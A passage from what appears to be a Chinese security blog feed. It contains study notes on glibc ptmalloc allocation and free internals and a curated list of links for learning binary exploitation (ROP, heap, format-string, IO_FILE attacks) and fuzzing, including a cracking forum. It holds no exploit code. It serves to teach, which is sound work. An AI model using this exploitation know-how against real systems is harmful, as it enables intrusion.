Bin"></a>Unsorted Bin</h3><ul><li>unsorted bin的队列使用bins数组的第一个</li><li>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中</li><li>在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。</li><li>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</li><li>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</li></ul><blockquote><p>并不是所有的chunk都按照上面的方式来组织，实际上，有三种例外情况。Top chunk，mmaped chunk和last remainder</p></blockquote><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><blockquote><p> top chunk对于主分配区和非主分配区是不一样的。</p></blockquote><ul><li>非主分配区<ul><li>对于非主分配区会预先从mmap区域分配一块较大的空闲内存模拟sub-heap，通过管理sub-heap来响应用户的需求</li><li>因为内存是按地址从低向高进行分配的，在空闲内存的最高处，必然存在着一块空闲chunk，叫做top chunk。</li><li>当bins和fast bins都不能满足分配需要的时候，ptmalloc会设法在top chunk中分出一块内存给用户 .如果top chunk本身不够大，分配程序会重新分配一个sub-heap，并将top chunk迁移到新的sub-heap上，新的sub-heap与已有的sub-heap用单向链表连接起来，然后在新的top chunk上分配所需的内存以满足分配的需要</li><li>实际上，top chunk在分配时总是在fast bins和bins之后被考虑，所以，不论top chunk有多大，它都不会被放到fast bins或者是bins中。</li><li>Top chunk的大小是随着分配和回收不停变换的，如果从top chunk分配内存会导致top chunk减小，如果回收的chunk恰好与top chunk相邻，那么这两个chunk就会合并成新的top chunk，从而使top chunk变大。</li><li>如果在free时回收的内存大于某个阈值，并且top chunk的大小也超过了收缩阈值，ptmalloc会收缩sub-heap，如果top-chunk包含了整个sub-heap，ptmalloc会调用munmap把整个sub-heap的内存返回给操作系统。</li></ul></li><li>主分配区<ul><li>由于主分配区是唯一能够映射进程heap区域的分配区，它可以通过sbrk()来增大或是收缩进程heap的大小</li><li>ptmalloc在开始时会预先分配一块较大的空闲内存（也就是所谓的 heap），主分配区的top chunk在第一次调用malloc时会分配一块(chunk_size + 128KB) align 4KB大小的空间作为初始的heap</li><li>用户从top chunk分配内存时，可以直接取出一块内存给用户。在回收内存时，回收的内存恰好与top chunk相邻则合并成新的top chunk，当该次回收的空闲内存大小达到某个阈值，并且top chunk的大小也超过了收缩阈值，会执行内存收缩，减小top chunk的大小，但至少要保留一个页大小的空闲内存，从而把内存归还给操作系统。</li><li>如果向主分配区的top chunk申请内存，而top chunk中没有空闲内存，ptmalloc会调用sbrk()将的进程heap的边界brk上移，然后修改top chunk的大小。</li></ul></li></ul><h3 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h3><blockquote><p>当需要分配的chunk足够大，而且fast bins和bins都不能满足要求，甚至top chunk本身也不能满足分配需求时，ptmalloc会使用mmap来直接使用内存映射来将页映射到进程空间。</p></blockquote><p>chunk在被free时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用将导致segmentation fault错误。这样的chunk也不会包含在任何bin中</p><h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><ul><li>Last remainder是另外一种特殊的chunk，就像top chunk和mmaped chunk一样，不会在任何bins中找到这种chunk。</li><li>当需要分配一个small chunk，但在small bins中找不到合适的chunk，如果last remainder chunk的大小大于所需的small chunk大小，last remainder chunk被分裂成两个chunk，其中一个chunk返回给用户，另一个chunk变成新的last remainder chuk</li></ul><h3 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h3><ul><li>bins是以何种结构存在的?</li><li>都有哪些bins?各自的特点如何?</li><li>有哪三种不同的bins?各自在什么地方使用?</li><li>top chunk的主分配区和非主分配区在使用时有什么不一样?</li></ul><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><ul><li><p>bin</p><ul><li>用户free掉的内存不都还给系统,ptmalloc会将相似大小的chunk用双向链表连起来,这就是Bin</li><li>一共维护有128个bin,第一个为unsorted bins</li><li>2-64为small bins</li><li>两相邻大小bins相差8bytes(small bins)</li><li>除了FAST BINS 都使用 FIFO原则</li><li>64-128为large bins ,每一个大小都在一定范围内,按大小排序,一样大的类似small bins使用</li><li>空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中</li></ul></li><li><p>fast bins</p><ul><li>size &lt; max_fast的chunk被free后先放入fastbins中,且不改变P</li><li>用户所要Chunk &lt; max_fast 时先便利fast bin</li><li>有时会便利fast bin,将相邻的chunk合并后放入unsorted bin中,然后将unsorted中的chunk 加入bin中</li></ul></li><li><p>unsorted bins</p><ul><li>使用bins数组的第一个,若free的chunk&gt;max_fast,或fast bins 合并后,先放入unsorted bin中</li><li>malloc时若fastbin中没有合适的,就现在unsorted中找,最后才是bins</li><li>若unsorted也不能满足分配,malloc会将其内的chunk放入bins中再分配</li><li>可以看作时bins的缓冲区,用来加快分配速度</li></ul></li><li><p>top chunk</p><ul><li>主分配区和非主分配区不一样</li><li>N_MA<ul><li>预先从mmap中分配一块较大的空闲内存模拟sub-heap(内存从低到高分配)</li><li>内存最高处必有空闲chunk为Top chunk</li><li>bins和fast bins都没有满足的时,会在TOP中分配</li><li>永远不会放入fastbins和bins中</li><li>若回收的chunk和top相连,会将它们合并,若大小大于某只且top大于收缩阈值,将收缩sub-heap,返回给系统</li></ul></li><li>MA<ul><li>先预先分配空闲内存(sub-heap)</li><li>MA的top首先malloc时会分配(chunk+128KB)align 4KB的空间为初始HEAP</li><li>回收大于阈值,top也大于阈值,则内存收缩.减少TOP但至少保留一页大小,剩下的归还给系统</li><li>申请内存时,top无空闲,将会用sbrk上移heap边界</li><li>若本身不够大,则重新分配sub-heap,并将top迁移到新的sub-heap上,以链表连接,重新分配</li></ul></li></ul></li><li><p>mmap chunk</p><ul><li>若分配内存太大,且fast和bins中都不能满足时,甚至连TOP也不够时,用mmap直接映射页到进程空间</li><li>分配的chunk被free时直接解除映射,还给系统</li></ul></li><li><p>last remainder</p><ul><li>需要分配small bins,但small中无合适的chunk时,若last大小大于所需的small chunk,将会分裂成两个chunk,一个给用户,一个变成新的last</li></ul></li></ul><h2 id="sbrk和mmap"><a href="#sbrk和mmap" class="headerlink" title="sbrk和mmap"></a>sbrk和mmap</h2><h3 id="内容-1"><a href="#内容-1" class="headerlink" title="内容"></a>内容</h3><ul><li>从进程的内存布局可知，.bss 段之上的这块分配给用户程序的空间被称为 heap （堆）。</li><li>start_brk 指向 heap 的开始，而 brk 指向 heap 的顶部。</li><li>可以使用系统调用 brk()和 sbrk()来增 加标识 heap 顶部的 brk 值，从而线性的增加分配给用户的 heap 空间。</li><li>在使用malloc 之前， brk的值等于start_brk，也就是说heap大小为0。</li><li>ptmalloc在开始时，若请求的空间小于 mmap 分配阈值（mmap threshold，默认值为 128KB）时<ul><li>主分配区会调用 sbrk()增加一块大小为 (128 KB + chunk_size) align 4KB 的空间作为 heap。</li><li>非主分配区会调用 mmap 映射一块大小为 HEAP_MAX_SIZE（32 位系统上默认为1MB，64 位系统上默认为64MB）的空间作为 sub-heap。 这就是前面所说的 ptmalloc 所维护的分配空间，</li><li>当用户请求内存分配时，首先会在这个区域内找一块合适的 chunk 给用户。</li></ul></li><li>当用户释放了 heap 中的 chunk 时，ptmalloc 又会使用 fast bins 和 bins 来组织空闲 chunk。以备用户的下一次分配。</li><li>若需要分配的 chunk 大小小于mmap 分配阈值，而 heap 空间又不够<ul><li>此时主分配区会通过 sbrk()调用来增加 heap 大小</li><li>非主分配区会调用mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增 加的值都会对齐到 4KB。 </li><li>当用户的请求超过mmap 分配阈值，并且主分配区使用 sbrk()分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用mmap()直接映射一块内存到进程内存空间。使用 mmap()直接映射的 chunk 在释放时直接解除映射，而不再属于进程的内存空间。任何对该内存的访问都会产生段错误。而在 heap 中或是 sub-heap中分配的空间则可能会留在进程内存空间内，还可以再次引用（当然是很危险的）。</li></ul></li><li>当 ptmalloc munmap chunk 时，如果回收的 chunk 空间大小大于mmap 分配阈值的当前值，并且小于 DEFAULT_MMAP_THRESHOLD_MAX（32 位系统默认为 512KB，64 位系统默认 为 32MB），ptmalloc 会把 mmap 分配阈值调整为当前回收的 chunk 的大小，并将 mmap 收 缩阈值（mmap trim threshold）设置为mmap 分配阈值的 2 倍。这就是 ptmalloc 的对mmap 分配阈值的动态调整机制，该机制是默认开启的，当然也可以用mallopt()关闭该机制。</li></ul><h3 id="问题-4"><a href="#问题-4" class="headerlink" title="问题"></a>问题</h3><ul><li>有什么不同的机制?</li><li>sbrk和mmap的区别是?</li></ul><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><ul><li>ptmalloc开始时,若小于mmap的分配阈值(128KB)<ul><li>则主分配区用sbrk增加一块大小为(128KB+chunk_size) align 4KB的内存作为heap</li><li>非主分配区会使用mmap映射一块大小为HEAP_SIZE(32-1MB,64-64MB)的空间为sub-heap</li><li>请求分配时,现在期内寻找相应的chunk</li><li>用户free chunk后会放入fast bins中</li></ul></li><li>若chunk &lt; mmap的分配阈值,但heap空间不足时<ul><li>主分配区会使用sbrk来增加大小</li><li>非主会用mmap映射新的sub-heap(对齐到4KB)</li></ul></li><li>若chunk &gt;mmap的分配阈值,但主分配区sbrk失败,非主分配区top chunk不足,就会用mmap映射内存</li><li>ptmalloc munmap chunk时 ,DEFAULT_MMAP_THRESHOLD_MAX(32 - 512kb , 64 - 32MB) &gt; 回收的chunk &gt; mmap分配阈值时<ol><li>将把mmap分配阈值调整为当前回收的chunk大小</li><li>将mmap收缩阈值设置为mmap分配阈值的2倍</li></ol></li></ul><h2 id="内存分配概述"><a href="#内存分配概述" class="headerlink" title="内存分配概述"></a>内存分配概述</h2><blockquote><p>分配算法概述，以 32 系统为例，64 位系统类似。 </p></blockquote><h3 id="内容-2"><a href="#内容-2" class="headerlink" title="内容"></a>内容</h3><ul><li>小于等于 64 字节：用 pool 算法分配。</li><li>64 到 512 字节之间：在最佳匹配算法分配和 pool 算法分配中取一种合适的。</li><li>大于等于 512 字节：用最佳匹配算法分配。 </li><li>大于等于mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配<ul><li>如果没有开启mmap分配阈值的动态调整机制，大于等于 128KB 就直接调用mmap分配。</li><li>否则，大于等于mmap分配阈值时才直接调用mmap()分配。</li></ul></li></ul><h3 id="分配的具体步骤"><a href="#分配的具体步骤" class="headerlink" title="分配的具体步骤"></a>分配的具体步骤</h3><ol><li>获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要 取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存 在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜 索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都 已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循 环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的 新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分 配区时会调用mmap()创建一个 sub-heap，并设置好 top chunk。</li><li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。 </li><li>判断所需分配chunk的大小是否满足chunk_size &lt;&#x3D; max_fast (max_fast 默认为 64B)， 如果是的话，则转下一步，否则跳到第 5 步。</li><li>首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分 配结束。否则转到下一步。</li><li>判断所需大小是否处在 small bins 中，即判断 chunk_size &lt; 512B 是否成立。如果 chunk 大小处在 small bins 中，则转下一步，否则转到第 6 步。</li><li>根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘 取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。</li><li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的 chunk。于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并， 并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只 有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大 小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直 接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 small bins 或是 large bins 中，遍历完成后，转入下一步。</li><li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中 都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净 了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从 中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则 分配结束，否则转到下一步。</li><li>如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来 进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 top chunk 中分出一块来。否则转到下一步。</li><li>到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如 果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用mmap 来分配一个新的 sub-heap，增加 top chunk 大小；或者使用mmap()来直接分配。在 这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用mmap 分配， 否则跳到第 12 步，增加 top chunk 的大小。</li><li>使用mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。 然后将内存指针返回给用户。</li><li>判断是否为第一次调用malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初 始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切 割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。</li></ol><h3 id="问题-5"><a href="#问题-5" class="headerlink" title="问题"></a>问题</h3><ul><li>用了什么算法?</li><li>分配的步骤大概为?</li></ul><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><blockquote><p>这里用了华庭师傅的总结</p></blockquote><ul><li>根据用户请求分配的内存的大小，ptmalloc 有可能会在两个地方为用户分配内存空间。</li><li>在第一次分配内存时，一般情况下只存在一个主分配区，但也有可能从父进程那里继承来了多个非主分配区，在这里主要讨论主分配区的情况.</li><li>开始时brk 值等于 start_brk，所以实际上 heap 大小为 0，top chunk 大小也是 0。这时，如果不增加 heap 大小，就不能满足任何分配要求。</li><li>若用户的请求的内存大小小于mmap 分配阈值， 则 ptmalloc 会初始 heap。然后在 heap 中分配空间给用户，以后的分配就基于这个 heap 进行。</li><li>若第一次用户的请求就大于 mmap 分配阈值，则 ptmalloc 直接使用 mmap()分配 一块内存给用户，而 heap 也就没有被初始化，直到用户第一次请求小于 mmap 分配阈 值的内存分配。</li><li>第一次以后的分配就比较复杂了<ul><li>简单说来，ptmalloc首先会查找fast bins</li><li>如果不能找到匹配的 chunk，则查找 small bins。</li><li>若还是不行，合并 fast bins，把 chunk 加入 unsorted bin，在 unsorted bin 中查找</li><li>若还是不行，把 unsorted bin 中的 chunk 全 加入 large bins 中，并查找 large bins。</li><li>在 fast bins 和 small bins 中的查找都需要精确匹配， 而在 large bins 中查找时，则遵循“smallest-first，best-fit”的原则，不需要精确匹配。</li><li>若以上方法都失败了，则 ptmalloc 会考虑使用 top chunk。</li><li>若 top chunk 也不能满足分配 要求。而且所需 chunk 大小大于 mmap 分配阈值，则使用 mmap 进行分配。否则增加 heap，增大 top chunk。以满足分配要求</li></ul></li></ul><h2 id="内存回收概述"><a href="#内存回收概述" class="headerlink" title="内存回收概述"></a>内存回收概述</h2><blockquote><p>free() 函数接受一个指向分配区域的指针作为参数，释放该指针所指向的 chunk。而具体的释放方法则看该 chunk 所处的位置和该 chunk 的大小</p></blockquote><h3 id="工作步骤"><a href="#工作步骤" class="headerlink" title="工作步骤"></a>工作步骤</h3><ol><li>free()函数同样首先需要获取分配区的锁，来保证线程安全。</li><li>判断传入的指针是否为 0，如果为 0，则什么都不做，直接 return。否则转下一步。 </li><li>判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap()释放 mmaped chunk，解除内存空间映射，该该空间不再有效。如果开启了mmap 分配 阈值的动态调整机制，并且当前回收的 chunk 大小大于mmap 分配阈值，将mmap 分配阈值设置为该 chunk 的大小，将 mmap 收缩阈值设定为 mmap 分配阈值的 2 倍，释放完成，否则跳到下一步。</li><li>判断 chunk 的大小和所处的位置，若 chunk_size &lt;&#x3D; max_fast，并且 chunk 并不位于 heap 的顶部，也就是说并不与 top chunk 相邻，则转到下一步，否则跳到第 6 步。 （因为与 top chunk 相邻的小 chunk 也和 top chunk 进行合并，所以这里不仅需要 判断大小，还需要判断相邻情况）</li><li>将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中时，并不修改该 chunk 使用状 态位 P。也不与相邻的 chunk 进行合并。只是放进去，如此而已。这一步做完之后 释放便结束了，程序从 free()函数中返回。</li><li>判断前一个 chunk 是否处在使用中，如果前一个块也是空闲块，则合并。并转下一 步。</li><li>判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转 下一步。</li><li>判断下一个 chunk 是否处在使用中，如果下一个 chunk 也是空闲的，则合并，并将合并后的 chunk 放到 unsorted bin 中。注意，这里在合并的过程中，要更新 chunk 的大小，以反映合并后的 chunk 的大小。并转到第 10 步。</li><li>如果执行到这一步，说明释放了一个与 top chunk 相邻的 chunk。则无论它有多大， 都将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。</li><li>判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认 64KB），如果是的话，则会触发进行 fast bins 的合并操作，fast bins 中的 chunk 将被 遍历，并与相邻的空闲 chunk 进行合并，合并后的 chunk 会被放到 unsorted bin 中。 fast bins 将变为空，操作完成之后转下一步。</li><li>判断 top chunk 的大小是否大于mmap 收缩阈值（默认为 128KB），如果是的话，对 于主分配区，则会试图归还 top chunk 中的一部分给操作系统。但是最先分配的 128KB 空间是不会归还的，ptmalloc 会一直管理这部分内存，用于响应用户的分配 请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。做 完这一步之后，释放结束，从 free() 函数退出。可以看出，收缩堆的条件是当前 free 的 chunk 大小加上前后能合并 chunk 的大小大于 64k，并且要 top chunk 的大 小要达到mmap 收缩阈值，才有可能收缩堆。</li></ol><h3 id="问题-6"><a href="#问题-6" class="headerlink" title="问题"></a>问题</h3><ul><li>概述一下大概过程?</li><li>有什么特点?</li></ul><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><ol><li>先获取锁,然后判断指针是否为0,为0就直接return</li><li>否则判断是否时mmap分配的,是就直接删除映射,进行动态阈值调整</li><li>否则就判断chunk的大小和位置,如果 chunk &lt; max_fast 并且不位于heap顶部,就放入fast bins中</li><li>否则判断前一个chunk是否在使用中,如果前一个也是空闲块就合并然后放入unsorted bins中</li><li>判断是否大于FASTBIM_CONNSOLIDATION_THRESHOLD,若大于就合并fast bins然后放入unsorted中,此时Fast bins变为空</li><li>判断top chunk大小是否大于mmap收缩阈值,若是<ul><li>主分配区就归还top chunk的一部分给系统,开始的128KB不会归还</li><li>非主分配区会进行sub-heap的收缩,将其中一部分归还给操作系统,若top chunk为整个sub-heap就全部归还</li><li>如果chunk与top chunk相邻也要如此操作</li></ul></li></ol><p>关于源代码的相关分析部分这里就不记了,读完华庭师傅的文章收益良多,可能得多读几遍才能领会其中奥秘</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_learning&amp;&amp;FUZZ</title>
    <link href="/2019/03/09/pwn-learning-FUZZ/"/>
    <url>/2019/03/09/pwn-learning-FUZZ/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-learning-FUZZ"><a href="#pwn-learning-FUZZ" class="headerlink" title="pwn_learning&amp;&amp;FUZZ"></a>pwn_learning&amp;&amp;FUZZ</h1><blockquote><p>This project is used to collect learning materials!And I will synchronous update it on my github!</p></blockquote><hr><h2 id="tools-be-used-in-the-pwn"><a href="#tools-be-used-in-the-pwn" class="headerlink" title="tools be used in the pwn"></a>tools be used in the pwn</h2><ul><li><p><a href="https://www.hex-rays.com/products/ida/">IDA pro反编译神器 推荐书籍：《IDA PRO 权威指南》</a> </p></li><li><p><a href="https://www.gnu.org/software/gdb/">gdb : Linux&#x2F;Unix下的动态调试利器 </a></p><p>  推荐插件：<br>  1. <a href="https://github.com/longld/peda">pead</a> ;   2. <a href="https://github.com/hugsy/gef">gef</a></p></li><li><p><a href="http://docs.pwntools.com/en/stable/">pwntools:一个强大的pwn辅助库</a></p></li><li><p><a href="https://github.com/niklasb/libc-database">ibc_database:收录了很多的libc库</a></p></li><li><p><a href="htts://github.com/david942j/one_gadget">one_gadget:用以寻找调用系统函数的gadget并输出满足条件</a></p></li><li><p><a href="https://github.com/lieanu/LibcSearcher">libcSearch : 用以搜索libc的版本</a></p></li><li><p><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget : 用于在程序中寻找我们所需要的东西</a></p></li><li><p><a href="https://github.com/angr/angr.git">angr:具有动静态分析的二进制分析工具</a></p></li><li><p><a href="http://www.ollydbg.de/version2.html">ollyDbg : 逆向破解利器</a></p></li><li><p><a href="https://github.com/radare/radare2.git">radare2: 强大的逆向工程和二进制分析框架</a></p></li></ul><hr><h2 id="NEWS"><a href="#NEWS" class="headerlink" title="NEWS"></a>NEWS</h2><ul><li><a href="https://thehackernews.com/">Thehackernews</a></li><li><a href="https://www.freebuf.com/">Freebuf</a></li><li><a href="https://www.anquanke.com/">安全客</a></li><li><a href="https://www.secfree.com/">指尖安全</a></li></ul><hr><h2 id="BBS"><a href="#BBS" class="headerlink" title="BBS"></a>BBS</h2><ul><li><a href="http://offensivecommunity.net/">Offensive Community</a></li><li><a href="https://cracking.org/forums/cracking-tools.16/">Cracking</a></li></ul><hr><h2 id="Online-course"><a href="#Online-course" class="headerlink" title="Online course"></a>Online course</h2><ul><li><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">二进制入门</a></li><li><a href="https://www.youtube.com/results?sp=EgIQAw%253D%253D&search_query=reverse+engineering"> 逆向工程</a></li><li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/">Modern Binary Exploitation</a></li><li><a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/">inux (x86) Exploit Development Series</a></li><li><a href="http://liveoverflow.com/binary_hacking/index.html">liveoverflow: Binary Hacking Course</a></li><li><a href="https://www.fuzzysecurity.com/tutorials.html">Lots of Tutorials</a></li></ul><hr><h2 id="Learning-materials"><a href="#Learning-materials" class="headerlink" title="Learning materials"></a>Learning materials</h2><ul><li><a href="https://ctf-wiki.github.io/">ctf-wiki</a></li><li><a href="https://blog.csdn.net/aemperor/article/details/47310593">堆溢出攻击原理</a></li><li><a href="https://www.freebuf.com/articles/rookie/182894.html">溢出之retlibc2详解</a></li><li><a href="https://github.com/firmianay/CTF-All-In-One">ctf all in one</a></li><li><a href="https://github.com/jmpews/pwn2exploit">pwn &amp; exploit</a></li></ul><hr><h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><ul><li><p><a href="http://bobao.360.cn/learning/detail/3717.html">手把手教你栈溢出从入门到放弃（上）</a></p></li><li><p><a href="http://bobao.360.cn/learning/detail/3718.html">手把手教你栈溢出从入门到放弃（下）</a></p></li><li><p><a href="http://bestwing.me/2017/03/18/stack-overflow-one/">Swing: 基础栈溢出复习 之基础</a></p></li><li><p><a href="https://bbs.ichunqiu.com/thread-45542-1-1.html">pwn入门之栈溢出练习</a></p></li><li><p><a href="http://0x48.pw/2016/11/03/0x26/">Hcamael: PWN学习总结之基础栈溢出</a></p></li><li><p><a href="http://0x48.pw/2016/11/21/0x27/">Hcamael: PWN学习总结之基础栈溢出2</a></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3></li><li><p>.<a href="http://drops.xmd5.com/static/drops/tips-6597.html">一步一步学ROP之linux_x86篇</a></p></li><li><p><a href="http://cb.drops.wiki/drops/binary-10638.html">一步一步学ROP之gadgets和2free篇</a></p></li><li><p>.<a href="http://cb.drops.wiki/drops/papers-11390.html">一步一步学ROP之Android ARM 32位篇</a></p></li><li><p>.<a href="http://www.freebuf.com/articles/network/87447.html">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p></li><li><p>.<a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/">Swing: 基础栈溢出复习 三 之 SROP</a></p></li><li><p><a href="http://www.freebuf.com/articles/system/149214.html">如何在32位系统中使用ROP+Return-to-dl来绕过ASLR+DEP</a></p></li><li><p><a href="http://www.evil0x.com/posts/19226.html">通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</a></p></li></ul><hr><h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><ul><li><a href="https://heap-exploitation.dhavalkapil.com/introduction.html">Heap Exploitation</a></li><li><a href="https://github.com/shellphish/">how2heap</a></li><li><a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/?spm=a313e.7916648.0.0.x4nzYZ">Heap overflow using unlink</a></li><li><a href="https://www.tuicool.com/articles/E3Ezu2u">堆溢出的unlink利用方法</a></li><li><a href="http://www.freebuf.com/articles/system/151372.html">Dance In Heap</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction/">堆利用简介</a></li></ul><hr><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/">原理简介</a></li><li><a href="http://cb.drops.wiki/drops/binary-6259.html">二进制漏洞之——邪恶的printf</a></li><li><a href="http://bobao.360.cn/learning/detail/3654.html">格式化字符串漏洞利用小结</a></li><li><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html">Linux下的格式化字符串漏洞利用姿势</a></li></ul><hr><h2 id="IO-FILE利用"><a href="#IO-FILE利用" class="headerlink" title="IO_FILE利用"></a>IO_FILE利用</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/">FILE 文件结构介绍</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/">伪造 vtable 劫持程序流程</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop/">FSOP</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/">新版本 libc 下 IO_FILE 的利用</a></li></ul><hr><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>*<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction/">条件竞争介绍</a></p><hr><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/">整数溢出原理介绍</a></li></ul><hr><h2 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/">Python 沙箱逃逸</a></li></ul><hr><h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><ul><li><a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&utm_medium=referral">借助DynELF实现无libc的漏洞利用小结</a></li><li><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">Finding Function’s Load Address</a></li><li><a href="http://skysider.com/?p=223">pwn tips</a></li><li><a href="https://github.com/Naetw/CTF-pwn-tips">CTF-pwn-tips</a></li><li><a href="http://www.angelwhu.com/blog/?p=460">pwn 学习总结</a></li><li><a href="http://www.cnblogs.com/Ox9A82/p/5559167.html">CTF中做Linux下漏洞利用的一些心得</a></li><li><a href="http://drops.xmd5.com/static/drops/binary-6521.html">linux常见漏洞利用技术实践</a></li></ul><hr><h1 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ul><li><a href="https://www.freebuf.com/sectool/89001.html">从零开始学Fuzzing系列：浏览器挖掘框架Morph诞生记</a></li><li><a href="http://blog.nsfocus.net/peach-fuzz/">浅析Peach Fuzz</a></li><li><a href="https://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/">From fuzzing to 0-day</a></li><li><a href="http://www.fuzzing.org/">Fuzzing: Brute Force Vulnerability Discovery</a></li><li><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">Fuzzing workflows; a fuzz job from start to finish</a></li><li><a href="http://j00ru.vexillium.org/slides/2016/blackhat.pdf">有效的文件格式Fuzzing</a></li><li><a 